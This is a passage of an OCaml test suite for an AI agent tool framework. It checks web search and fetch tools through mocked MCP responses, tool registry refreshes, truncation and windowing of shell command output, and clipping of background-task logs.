    Connector_capabilities.discord.can_send_files;
  Alcotest.(check bool)
    "slack cannot send files" false Connector_capabilities.slack.can_send_files;
  Alcotest.(check bool)
    "plain cannot send files" false Connector_capabilities.plain.can_send_files

let test_doc_write_known_file () =
  let dir = make_tmp_workspace () in
  let tool =
    Tools_builtin.doc_write ~workspace:dir ~workspace_files:[ "TOOLS.md" ]
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [ ("filename", `String "TOOLS.md"); ("content", `String "data") ]))
  in
  Alcotest.(check bool)
    "mentions active" true
    (try
       ignore
         (Str.search_forward
            (Str.regexp_string "active workspace file")
            result 0);
       true
     with Not_found -> false);
  let result_unknown =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [ ("filename", `String "RANDOM.md"); ("content", `String "data") ]))
  in
  Alcotest.(check bool)
    "mentions not in list" true
    (try
       ignore
         (Str.search_forward
            (Str.regexp_string "not in workspace_files")
            result_unknown 0);
       true
     with Not_found -> false);
  (try Sys.remove (Filename.concat dir "TOOLS.md") with _ -> ());
  (try Sys.remove (Filename.concat dir "RANDOM.md") with _ -> ());
  try Sys.rmdir dir with _ -> ()

let test_web_search_reads_live_config_after_registry_refresh () =
  let base = Runtime_config.default in
  let registry = Tool_registry.create () in
  let not_configured = { base with web_search = None } in
  let configured =
    {
      base with
      web_search =
        Some
          {
            Runtime_config.search_provider = "brave";
            search_api_key = "reloaded-key";
            num_results = 7;
            search_base_url =
              Some "https://brave.example.invalid/res/v1/web/search";
          };
    }
  in
  Tool_registry.register registry
    (Tools_builtin.web_search ~config:not_configured);
  let tool1 = Option.get (Tool_registry.find registry "web_search") in
  let out1 =
    Lwt_main.run (tool1.invoke (`Assoc [ ("query", `String "clawq") ]))
  in
  Alcotest.(check string)
    "initial tool reports missing config"
    "Error: web_search not configured. Add a \"web_search\" section to \
     ~/.clawq/config.json with provider and api_key."
    out1;
  Tool_registry.replace registry (Tools_builtin.web_search ~config:configured);
  let tool2 = Option.get (Tool_registry.find registry "web_search") in
  let out2 =
    Lwt_main.run
      (tool2.invoke (`Assoc [ ("query", `String "clawq"); ("limit", `Int 7) ]))
  in
  Alcotest.(check bool)
    "replaced tool no longer uses missing-config closure" true
    (not (String.equal out2 out1))

let test_registry_remove_drops_tool () =
  let registry = Tool_registry.create () in
  let base = Runtime_config.default in
  let configured =
    {
      base with
      web_search =
        Some
          {
            Runtime_config.search_provider = "brave";
            search_api_key = "k";
            num_results = 5;
            search_base_url = None;
          };
    }
  in
  Tool_registry.register registry (Tools_builtin.web_search ~config:configured);
  Alcotest.(check bool)
    "tool present before remove" true
    (Tool_registry.find registry "web_search" <> None);
  Tool_registry.remove registry "web_search";
  Alcotest.(check bool)
    "tool absent after remove" true
    (Tool_registry.find registry "web_search" = None)

let test_zai_websearch_requires_api_key () =
  let tool = Tools_builtin.zai_websearch ~config:Runtime_config.default in
  let out =
    Lwt_main.run (tool.Tool.invoke (`Assoc [ ("query", `String "clawq") ]))
  in
  Alcotest.(check string)
    "missing key error"
    "Error: Z.ai API key not configured. Add a \"zai_mcp\" section to \
     ~/.clawq/config.json with \"enabled\": true, or set providers.zai.api_key \
     / providers.zai_coding.api_key."
    out

let zai_mcp_mock_http_post ?(discover_tool_name = "webSearch")
    ?(call_response =
      ( 200,
        "event: ping\n\
         data: {\"kind\":\"ping\"}\n\n\
         data: {\"result\":\n\
         data:   {\"content\": [{\"type\":\"text\",\"text\":\"first\"}, \
         {\"type\":\"text\",\"text\":\"second\"}]}}\n\n",
        "text/event-stream" )) ~call_log () ~uri ~headers ~body =
  let json = Yojson.Safe.from_string body in
  let method_ =
    try Yojson.Safe.Util.(json |> member "method" |> to_string) with _ -> ""
  in
  match method_ with
  | "initialize" ->
      Lwt.return
        ( 200,
          Yojson.Safe.to_string
            (`Assoc
               [
                 ( "result",
                   `Assoc
                     [
                       ("protocolVersion", `String "2024-11-05");
                       ( "serverInfo",
                         `Assoc
                           [
                             ("name", `String "zai-mcp");
                             ("version", `String "1.0");
                           ] );
                       ("capabilities", `Assoc []);
                     ] );
               ]),
          "application/json" )
  | "notifications/initialized" -> Lwt.return (202, "", "application/json")
  | "tools/list" ->
      Lwt.return
        ( 200,
          Yojson.Safe.to_string
            (`Assoc
               [
                 ( "result",
                   `Assoc
                     [
                       ( "tools",
                         `List
                           [
                             `Assoc
                               [
                                 ("name", `String discover_tool_name);
                                 ("description", `String "Search the web");
                                 ("inputSchema", `Assoc []);
                               ];
                           ] );
                     ] );
               ]),
          "application/json" )
  | "tools/call" ->
      call_log := Some (uri, headers, json);
      let status, resp_body, ct = call_response in
      Lwt.return (status, resp_body, ct)
  | _ ->
      call_log := Some (uri, headers, json);
      let status, resp_body, ct = call_response in
      Lwt.return (status, resp_body, ct)

let test_zai_websearch_success_invokes_mcp () =
  let call_log = ref None in
  let http_post =
    zai_mcp_mock_http_post ~discover_tool_name:"webSearch" ~call_log ()
  in
  let config =
    {
      Runtime_config.default with
      zai_mcp =
        Some
          {
            Runtime_config.key = "sk-zai";
            websearch_enabled = true;
            webfetch_enabled = true;
          };
    }
  in
  let tool = Tools_builtin.zai_websearch_with_post ~http_post ~config in
  let out =
    Lwt_main.run (tool.Tool.invoke (`Assoc [ ("query", `String "clawq") ]))
  in
  Alcotest.(check string) "response text" "first\nsecond" out;
  let uri, headers, body = Option.get !call_log in
  Alcotest.(check string)
    "endpoint" "https://api.z.ai/api/mcp/web_search_prime/mcp" uri;
  Alcotest.(check (list (pair string string)))
    "auth header"
    [ ("Authorization", "Bearer sk-zai") ]
    headers;
  let open Yojson.Safe.Util in
  Alcotest.(check string)
    "rpc method" "tools/call"
    (body |> member "method" |> to_string);
  (* Tool name comes from discovery, not hardcoded *)
  Alcotest.(check string)
    "tool name" "webSearch"
    (body |> member "params" |> member "name" |> to_string);
  Alcotest.(check string)
    "query argument" "clawq"
    (body |> member "params" |> member "arguments" |> member "query"
   |> to_string)

let test_zai_webfetch_success_invokes_mcp () =
  let call_log = ref None in
  let call_response =
    ( 200,
      Yojson.Safe.to_string
        (`Assoc
           [
             ( "result",
               `Assoc
                 [
                   ( "content",
                     `List
                       [
                         `Assoc
                           [
                             ("type", `String "text");
                             ("text", `String "page text");
                           ];
                       ] );
                 ] );
           ]),
      "application/json" )
  in
  let http_post =
    zai_mcp_mock_http_post ~discover_tool_name:"webReader" ~call_response
      ~call_log ()
  in
  let config =
    {
      Runtime_config.default with
      zai_mcp =
        Some
          {
            Runtime_config.key = "sk-zai";
            websearch_enabled = true;
            webfetch_enabled = true;
          };
    }
  in
  let tool = Tools_builtin.zai_webfetch_with_post ~http_post ~config in
  let out =
    Lwt_main.run
      (tool.Tool.invoke (`Assoc [ ("url", `String "https://example.com") ]))
  in
  Alcotest.(check string) "response text" "page text" out;
  let uri, headers, body = Option.get !call_log in
  Alcotest.(check string)
    "endpoint" "https://api.z.ai/api/mcp/web_reader/mcp" uri;
  Alcotest.(check (list (pair string string)))
    "auth header"
    [ ("Authorization", "Bearer sk-zai") ]
    headers;
  let open Yojson.Safe.Util in
  Alcotest.(check string)
    "rpc method" "tools/call"
    (body |> member "method" |> to_string);
  (* Tool name comes from discovery *)
  Alcotest.(check string)
    "tool name" "webReader"
    (body |> member "params" |> member "name" |> to_string);
  Alcotest.(check string)
    "url argument" "https://example.com"
    (body |> member "params" |> member "arguments" |> member "url" |> to_string)

let test_zai_websearch_negative_paths () =
  let config =
    {
      Runtime_config.default with
      zai_mcp =
        Some
          {
            Runtime_config.key = "sk-zai";
            websearch_enabled = true;
            webfetch_enabled = true;
          };
    }
  in
  let invoke_with status resp_body content_type =
    let call_log = ref None in
    let http_post =
      zai_mcp_mock_http_post ~discover_tool_name:"webSearch"
        ~call_response:(status, resp_body, content_type)
        ~call_log ()
    in
    let tool = Tools_builtin.zai_websearch_with_post ~http_post ~config in
    Lwt_main.run (tool.Tool.invoke (`Assoc [ ("query", `String "clawq") ]))
  in
  Alcotest.(check string)
    "http non-2xx surfaces status and body"
    "Error: Z.ai MCP returned HTTP 502: upstream down"
    (invoke_with 502 "upstream down" "text/plain");
  Alcotest.(check string)
    "http redirect is not treated as success"
    "Error: Z.ai MCP returned HTTP 302: moved"
    (invoke_with 302 "moved" "text/plain");
  Alcotest.(check string)
    "malformed json is actionable" "Error: Z.ai MCP returned malformed JSON."
    (invoke_with 200 "{not json" "application/json");
  Alcotest.(check string)
    "empty response is actionable"
    "Error: Z.ai MCP returned an empty response body."
    (invoke_with 200 "" "application/json");
  Alcotest.(check string)
    "rpc error message is surfaced" "Error: Z.ai MCP error: quota exceeded"
    (invoke_with 200
       (Yojson.Safe.to_string
          (`Assoc
             [
               ( "error",
                 `Assoc
                   [
                     ("code", `Int (-32001));
                     ("message", `String "quota exceeded");
                   ] );
             ]))
       "application/json");
  Alcotest.(check string)
    "sse without payload is actionable"
    "Error: Z.ai MCP returned an SSE response without a JSON payload."
    (invoke_with 200 "event: ping\n\n" "text/event-stream")

let test_zai_webfetch_negative_paths () =
  let config =
    {
      Runtime_config.default with
      zai_mcp =
        Some
          {
            Runtime_config.key = "sk-zai";
            websearch_enabled = true;
            webfetch_enabled = true;
          };
    }
  in
  let invoke_with status resp_body content_type =
    let call_log = ref None in
    let http_post =
      zai_mcp_mock_http_post ~discover_tool_name:"webReader"
        ~call_response:(status, resp_body, content_type)
        ~call_log ()
    in
    let tool = Tools_builtin.zai_webfetch_with_post ~http_post ~config in
    Lwt_main.run
      (tool.Tool.invoke (`Assoc [ ("url", `String "https://example.com") ]))
  in
  Alcotest.(check string)
    "http non-2xx surfaces status and body"
    "Error: Z.ai MCP returned HTTP 503: service unavailable"
    (invoke_with 503 "service unavailable" "text/plain");
  Alcotest.(check string)
    "http redirect is not treated as success"
    "Error: Z.ai MCP returned HTTP 301: moved"
    (invoke_with 301 "moved" "text/plain");
  Alcotest.(check string)
    "malformed json is actionable" "Error: Z.ai MCP returned malformed JSON."
    (invoke_with 200 "{broken" "application/json");
  Alcotest.(check string)
    "empty response is actionable"
    "Error: Z.ai MCP returned an empty response body."
    (invoke_with 200 "" "application/json");
  Alcotest.(check string)
    "rpc error message is surfaced" "Error: Z.ai MCP error: url blocked"
    (invoke_with 200
       (Yojson.Safe.to_string
          (`Assoc
             [
               ( "error",
                 `Assoc
                   [
                     ("code", `Int (-32002)); ("message", `String "url blocked");
                   ] );
             ]))
       "application/json");
  Alcotest.(check string)
    "sse without payload is actionable"
    "Error: Z.ai MCP returned an SSE response without a JSON payload."
    (invoke_with 200 "event: ping\n\n" "text/event-stream")

let test_zai_websearch_discovery_failure_falls_back () =
  let call_log = ref None in
  let http_post ~uri ~headers ~body =
    let json = Yojson.Safe.from_string body in
    let method_ =
      try Yojson.Safe.Util.(json |> member "method" |> to_string) with _ -> ""
    in
    match method_ with
    | "initialize" ->
        (* Discovery fails with HTTP 500 *)
        Lwt.return (500, "internal error", "text/plain")
    | "tools/call" ->
        call_log := Some (uri, headers, json);
        let sse =
          "data: {\"result\":\n\
           data:   {\"content\": [{\"type\":\"text\",\"text\":\"fallback \
           ok\"}]}}\n\n"
        in
        Lwt.return (200, sse, "text/event-stream")
    | _ -> Lwt.return (200, "{}", "application/json")
  in
  let config =
    {
      Runtime_config.default with
      zai_mcp =
        Some
          {
            Runtime_config.key = "sk-zai";
            websearch_enabled = true;
            webfetch_enabled = true;
          };
    }
  in
  let tool = Tools_builtin.zai_websearch_with_post ~http_post ~config in
  let out =
    Lwt_main.run (tool.Tool.invoke (`Assoc [ ("query", `String "test") ]))
  in
  Alcotest.(check string) "fallback works" "fallback ok" out;
  let _uri, _headers, body = Option.get !call_log in
  (* Falls back to hardcoded tool name *)
  Alcotest.(check string)
    "fallback tool name" "webSearchPrime"
    Yojson.Safe.Util.(body |> member "params" |> member "name" |> to_string)

let test_zai_websearch_cache_hit () =
  let init_count = ref 0 in
  let call_count = ref 0 in
  let http_post ~uri:_ ~headers:_ ~body =
    let json = Yojson.Safe.from_string body in
    let method_ =
      try Yojson.Safe.Util.(json |> member "method" |> to_string) with _ -> ""
    in
    match method_ with
    | "initialize" ->
        incr init_count;
        Lwt.return
          ( 200,
            Yojson.Safe.to_string
              (`Assoc
                 [
                   ( "result",
                     `Assoc
                       [
                         ("protocolVersion", `String "2024-11-05");
                         ( "serverInfo",
                           `Assoc
                             [
                               ("name", `String "zai");
                               ("version", `String "1.0");
                             ] );
                         ("capabilities", `Assoc []);
                       ] );
                 ]),
            "application/json" )
    | "notifications/initialized" -> Lwt.return (202, "", "application/json")
    | "tools/list" ->
        Lwt.return
          ( 200,
            Yojson.Safe.to_string
              (`Assoc
                 [
                   ( "result",
                     `Assoc
                       [
                         ( "tools",
                           `List
                             [
                               `Assoc
                                 [
                                   ("name", `String "cachedTool");
                                   ("description", `String "");
                                   ("inputSchema", `Assoc []);
                                 ];
                             ] );
                       ] );
                 ]),
            "application/json" )
    | "tools/call" ->
        incr call_count;
        Lwt.return
          ( 200,
            Yojson.Safe.to_string
              (`Assoc
                 [
                   ( "result",
                     `Assoc
                       [
                         ( "content",
                           `List
                             [
                               `Assoc
                                 [
                                   ("type", `String "text");
                                   ("text", `String "ok");
                                 ];
                             ] );
                       ] );
                 ]),
            "application/json" )
    | _ -> Lwt.return (200, "{}", "application/json")
  in
  let config =
    {
      Runtime_config.default with
      zai_mcp =
        Some
          {
            Runtime_config.key = "sk-zai";
            websearch_enabled = true;
            webfetch_enabled = true;
          };
    }
  in
  let tool = Tools_builtin.zai_websearch_with_post ~http_post ~config in
  let _out1 =
    Lwt_main.run (tool.Tool.invoke (`Assoc [ ("query", `String "first") ]))
  in
  let _out2 =
    Lwt_main.run (tool.Tool.invoke (`Assoc [ ("query", `String "second") ]))
  in
  Alcotest.(check int) "initialize called once" 1 !init_count;
  Alcotest.(check int) "tools/call called twice" 2 !call_count

let test_zai_websearch_integration () =
  let config = Config_loader.load_readonly () in
  let api_key =
    match config.zai_mcp with
    | Some cfg when Runtime_config.is_key_set cfg.key -> cfg.key
    | _ -> ""
  in
  if not (Runtime_config.is_key_set api_key) then Alcotest.skip ()
  else
    let tool = Tools_builtin.zai_websearch ~config in
    let out =
      Lwt_main.run
        (tool.Tool.invoke
           (`Assoc [ ("query", `String "OCaml programming language") ]))
    in
    Alcotest.(check bool) "result is non-empty" true (String.length out > 0);
    Alcotest.(check bool)
      "result is not an error" true
      (not (String.length out >= 6 && String.sub out 0 6 = "Error:"))

let test_zai_webfetch_integration () =
  let config = Config_loader.load_readonly () in
  let api_key =
    match config.zai_mcp with
    | Some cfg when Runtime_config.is_key_set cfg.key -> cfg.key
    | _ -> ""
  in
  if not (Runtime_config.is_key_set api_key) then Alcotest.skip ()
  else
    let tool = Tools_builtin.zai_webfetch ~config in
    let out =
      Lwt_main.run
        (tool.Tool.invoke (`Assoc [ ("url", `String "https://example.com") ]))
    in
    Alcotest.(check bool) "result is non-empty" true (String.length out > 0);
    Alcotest.(check bool)
      "result is not an error" true
      (not (String.length out >= 6 && String.sub out 0 6 = "Error:"));
    Alcotest.(check bool)
      "result contains expected content" true
      (let low = String.lowercase_ascii out in
       String.length low > 0
       &&
         try
           ignore (Str.search_forward (Str.regexp_string "example") low 0);
           true
         with Not_found -> false)

let test_register_builtin_tools_includes_enabled_zai_tools () =
  let registry = Tool_registry.create () in
  let sandbox =
    Sandbox.create ~backend:Sandbox.None ~workspace:"." ~extra_allowed_paths:[]
      ~workspace_only:false ()
  in
  let config =
    {
      Runtime_config.default with
      zai_mcp =
        Some
          {
            Runtime_config.key = "sk-zai";
            websearch_enabled = true;
            webfetch_enabled = false;
          };
    }
  in
  Tools_builtin.register_all ~config ~sandbox registry;
  Alcotest.(check bool)
    "zai_websearch registered" true
    (Tool_registry.find registry "zai_websearch" <> None);
  Alcotest.(check bool)
    "zai_webfetch omitted when disabled" true
    (Tool_registry.find registry "zai_webfetch" = None)

let test_refresh_replaces_config_bound_tools () =
  let base = Runtime_config.default in
  let registry = Tool_registry.create () in
  let cfg1 = { base with stt = None } in
  Tool_registry.register registry (Tools_builtin.transcribe ~config:cfg1);
  let t1 = Option.get (Tool_registry.find registry "transcribe") in
  let cfg2 =
    {
      base with
      stt =
        Some
          {
            Runtime_config.provider = "openai";
            model = "whisper-1";
            language = None;
          };
    }
  in
  Tool_registry.replace registry (Tools_builtin.transcribe ~config:cfg2);
  let t2 = Option.get (Tool_registry.find registry "transcribe") in
  Alcotest.(check bool) "replace swaps to new tool instance" true (t1 != t2);
  Alcotest.(check int)
    "registry has exactly one transcribe" 1
    (List.length
       (List.filter
          (fun (t : Tool.t) -> t.name = "transcribe")
          (Tool_registry.list registry)))

let test_shell_exec_saves_full_output_when_truncated () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let long_text = String.make 25050 'x' in
      let cmd = "head -c 25050 /dev/zero | tr '\\0' 'x'; echo" in
      let result =
        Lwt_main.run (tool.Tool.invoke (`Assoc [ ("command", `String cmd) ]))
      in
      Alcotest.(check bool)
        "mentions saved stdout path" true
        (Option.is_some (extract_saved_output_path result));
      let path = Option.get (extract_saved_output_path result) in
      let ic = open_in path in
      let saved = really_input_string ic (in_channel_length ic) in
      close_in ic;
      Alcotest.(check int)
        "saved output preserves full size"
        (String.length long_text + 1)
        (String.length saved);
      Sys.remove path)

let test_shell_exec_head_and_tail_window_output () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let command =
        "printf 'o1\no2\no3\no4\no5' && printf 'e1\ne2\ne3\ne4\ne5' 1>&2"
      in
      let result =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc
                [
                  ("command", `String command);
                  ("head", `Int 2);
                  ("tail", `Int 2);
                ]))
      in
      Alcotest.(check bool)
        "stdout head visible" true (contains result "o1\no2");
      Alcotest.(check bool)
        "stdout tail visible" true (contains result "o4\no5");
      Alcotest.(check bool) "stdout middle omitted" false (contains result "o3");
      Alcotest.(check bool)
        "stderr head visible" true (contains result "e1\ne2");
      Alcotest.(check bool)
        "stderr tail visible" true (contains result "e4\ne5");
      Alcotest.(check bool) "stderr middle omitted" false (contains result "e3");
      Alcotest.(check bool)
        "window marker visible" true
        (contains result "showing first 2 and last 2 of 5"))

let test_shell_exec_head_tail_window_handles_trailing_newline () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let command =
        "printf 'o1\no2\no3\no4\no5\n' && printf 'e1\ne2\ne3\ne4\ne5\n' 1>&2"
      in
      let result =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc
                [
                  ("command", `String command);
                  ("head", `Int 2);
                  ("tail", `Int 2);
                ]))
      in
      Alcotest.(check bool)
        "stdout trailing newline tail visible" true (contains result "o4\no5");
      Alcotest.(check bool)
        "stderr trailing newline tail visible" true (contains result "e4\ne5");
      Alcotest.(check bool)
        "no blank tail line" false
        (contains result "o5\n\n[full stdout saved"
        || contains result "e5\n\n[full stderr saved");
      Alcotest.(check bool)
        "window marker counts logical lines" true
        (contains result "showing first 2 and last 2 of 5"))

let test_shell_exec_head_or_tail_only_window_output () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let head_result =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc
                [
                  ("command", `String "printf 'a1\na2\na3\na4\n'");
                  ("head", `Int 2);
                ]))
      in
      let tail_result =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc
                [
                  ("command", `String "printf 'b1\nb2\nb3\nb4\n'");
                  ("tail", `Int 2);
                ]))
      in
      Alcotest.(check bool)
        "head-only keeps first line" true
        (contains head_result "a1\na2");
      Alcotest.(check bool)
        "head-only omits trailing line" false
        (contains head_result "a4");
      Alcotest.(check bool)
        "head-only marker visible" true
        (contains head_result "omitted 2 trailing lines; showing first 2 of 4");
      Alcotest.(check bool)
        "tail-only keeps last line" true
        (contains tail_result "b3\nb4");
      Alcotest.(check bool)
        "tail-only omits leading line" false
        (contains tail_result "b1");
      Alcotest.(check bool)
        "tail-only marker visible" true
        (contains tail_result "omitted 2 leading lines; showing last 2 of 4"))

let test_shell_exec_total_lines_shown_with_head_or_tail () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      (* head+tail with truncation: total lines note present *)
      let truncated_result =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc
                [
                  ("command", `String "printf 'a\nb\nc\nd\ne'");
                  ("head", `Int 2);
                  ("tail", `Int 2);
                ]))
      in
      Alcotest.(check bool)
        "truncated: stdout total lines note" true
        (contains truncated_result "[stdout: 5 total lines]");
      Alcotest.(check bool)
        "truncated: stderr total lines note" true
        (contains truncated_result "[stderr: 0 total lines]");
      (* head+tail without truncation (output fits): total lines note present *)
      let fits_result =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc
                [
                  ("command", `String "printf 'x\ny\nz'");
                  ("head", `Int 5);
                  ("tail", `Int 5);
                ]))
      in
      Alcotest.(check bool)
        "fits: stdout total lines note" true
        (contains fits_result "[stdout: 3 total lines]");
      (* no head/tail: no total lines note *)
      let no_window_result =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc [ ("command", `String "printf 'a\nb\nc'") ]))
      in
      Alcotest.(check bool)
        "no window: no total lines note" false
        (contains no_window_result "total lines"))

let test_background_task_logs_truncates_large_output () =
  with_temp_workspace (fun workspace ->
      let task =
        {
          Background_task.id = 1;
          runner = Background_task.Codex;
          model = None;
          repo_path = workspace;
          prompt = "test";
          branch = "clawq-bg-test";
          worktree_path = None;
          log_path = Some (Filename.concat workspace "large-task.log");
          status = Background_task.Succeeded;
          session_key = None;
          channel = None;
          channel_id = None;
          pid = None;
          result_preview = None;
          created_at = "2026-03-11 00:00:00";
          started_at = None;
          finished_at = None;
          automerge = false;
          use_worktree = true;
          merge_status = None;
          retry_count = 0;
          parent_task_id = None;
          replaced_by = None;
          runner_session_id = None;
          acp = false;
          agent_name = None;
          notification_status = None;
          notification_error = None;
          notification_attempts = 0;
        }
      in
      let oc = open_out (Option.get task.log_path) in
      for i = 1 to 200 do
        Printf.fprintf oc "line-%03d %s\n" i (String.make 80 'x')
      done;
      close_out oc;
      let result =
        match Background_task.log_excerpt task ~lines:200 with
        | Ok text -> text
        | Error msg -> failwith msg
      in
      Alcotest.(check bool)
        "truncated marker visible" true
        (contains result "Output truncated by size budget");
      Alcotest.(check bool)
        "continuation hint visible" true
        (contains result "Use offset=");
      Alcotest.(check bool)
        "keeps early lines" true
        (contains result "1: line-001");
      Alcotest.(check bool)
        "drops later lines once truncated" false
        (contains result "200: line-200");
      Alcotest.(check bool)
        "stays under tightened budget" true
        (String.length result < 3800);
      ())

let test_background_task_logs_truncates_pathological_long_line () =
  with_temp_workspace (fun workspace ->
      let task =
        {
          Background_task.id = 1;
          runner = Background_task.Codex;
          model = None;
          repo_path = workspace;
          prompt = "test";
          branch = "clawq-bg-test";
          worktree_path = None;
          log_path = Some (Filename.concat workspace "huge-line.log");
          status = Background_task.Succeeded;
          session_key = None;
          channel = None;
          channel_id = None;
          pid = None;
          result_preview = None;
          created_at = "2026-03-11 00:00:00";
          started_at = None;
          finished_at = None;
          automerge = false;
          use_worktree = true;
          merge_status = None;
          retry_count = 0;
          parent_task_id = None;
          replaced_by = None;
          runner_session_id = None;
          acp = false;
          agent_name = None;
          notification_status = None;
          notification_error = None;
          notification_attempts = 0;
        }
      in
      let oc = open_out (Option.get task.log_path) in
      output_string oc (String.make 20000 'x');
      close_out oc;
      let tail_result =
        match Background_task.log_excerpt task ~lines:1 with
        | Ok text -> text
        | Error msg -> failwith msg
      in
      let paged_result =
        match Background_task.log_excerpt task ~offset:1 ~lines:1 with
        | Ok text -> text
        | Error msg -> failwith msg
      in
      List.iter
        (fun (label, result) ->
          Alcotest.(check bool)
            (label ^ " keeps a visible numbered line")
            true
            (contains result "1: xxxxx");
          Alcotest.(check bool)
            (label ^ " marks truncated line")
            true
            (contains result "(truncated");
          Alcotest.(check bool)
            (label ^ " mentions long-line clipping")
            true
            (contains result "long log lines are truncated");
          Alcotest.(check bool)
            (label ^ " avoids invalid empty range")
            false
            (contains result "lines 1-0");
          Alcotest.(check bool)
            (label ^ " stays bounded") true
            (String.length result < 2500))
        [ ("tail", tail_result); ("paged", paged_result) ])

let test_background_task_logs_clamps_excessive_lines () =
  with_temp_workspace (fun workspace ->
      let task =
        {
          Background_task.id = 1;
          runner = Background_task.Codex;
          model = None;
          repo_path = workspace;
          prompt = "test";
          branch = "clawq-bg-test";
          worktree_path = None;
          log_path = Some (Filename.concat workspace "many-lines.log");
          status = Background_task.Succeeded;
          session_key = None;
          channel = None;
          channel_id = None;
          pid = None;
          result_preview = None;
          created_at = "2026-03-11 00:00:00";
          started_at = None;
          finished_at = None;
          automerge = false;
          use_worktree = true;
          merge_status = None;
          retry_count = 0;
          parent_task_id = None;
          replaced_by = None;
          runner_session_id = None;
          acp = false;
          agent_name = None;
          notification_status = None;
          notification_error = None;
          notification_attempts = 0;
        }
      in
      let oc = open_out (Option.get task.log_path) in
      for i = 1 to 1000 do
        Printf.fprintf oc "line-%04d short content\n" i
      done;
      close_out oc;
      let result =
        match Background_task.log_excerpt task ~lines:1000 with
        | Ok text -> text
        | Error msg -> failwith msg
      in
      Alcotest.(check bool)
        "stays under budget" true
        (String.length result < 3800);
      Alcotest.(check bool)
        "truncation hint present" true
        (contains result "Output truncated by size budget"
        || contains result "Use offset=");
      ())

let test_shell_exec_saves_full_output_when_windowed () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let command = "printf 'x1\nx2\nx3\nx4\nx5\n'" in
      let result =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc
                [
                  ("command", `String command);
                  ("head", `Int 2);
                  ("tail", `Int 2);
                ]))
      in
      Alcotest.(check bool)
        "windowed output mentions saved stdout path" true
        (Option.is_some (extract_saved_output_path result));
      let path = Option.get (extract_saved_output_path result) in
      let ic = open_in path in
      let saved = really_input_string ic (in_channel_length ic) in
      close_in ic;
      Alcotest.(check string)
        "saved output preserves omitted lines" "x1\nx2\nx3\nx4\nx5\n" saved;
      Sys.remove path)

let test_shell_exec_rejects_non_positive_head_or_tail () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let result_head =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc [ ("command", `String "printf 'ok'"); ("head", `Int 0) ]))
      in
      let result_tail =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc [ ("command", `String "printf 'ok'"); ("tail", `Int (-1)) ]))
      in
      Alcotest.(check string)
        "head validation" "Error: head must be >= 1" result_head;
      Alcotest.(check string)
        "tail validation" "Error: tail must be >= 1" result_tail)

let test_shell_exec_interrupts_running_process () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let interrupted = ref None in
      let started_at = Unix.gettimeofday () in
      let result =
        Lwt_main.run
          (let open Lwt.Syntax in
           let trigger =
             let* () = Lwt_unix.sleep 0.03 in
             interrupted := Some "stop now";
             Lwt.return_unit
           in
           let invoke =
             tool.Tool.invoke
               ~context:
                 {
                   Tool.session_key = Some "web:test";
                   send_progress = None;
                   interrupt_check = Some (fun () -> !interrupted);
                   inject_system_messages = None;
                   effective_cwd = None;
                   request_cwd_change = None;
                 }
               (`Assoc [ ("command", `String "sleep 10") ])
           in
           let* result, () = Lwt.both invoke trigger in
           Lwt.return result)
      in
      let elapsed = Unix.gettimeofday () -. started_at in
      Alcotest.(check bool)
        "result contains bg job info" true
        (contains result "Background shell job");
      Alcotest.(check bool) "returns promptly" true (elapsed < 2.0);
      (* Clean up: kill the background sleep process *)
      let job_id =
        try
          let re = Str.regexp {|Background shell job #\([0-9]+\)|} in
          ignore (Str.search_forward re result 0);
          int_of_string (Str.matched_group 1 result)
        with _ -> -1
      in
      if job_id >= 0 then begin
        let job = Option.get (Bg_shell.find job_id) in
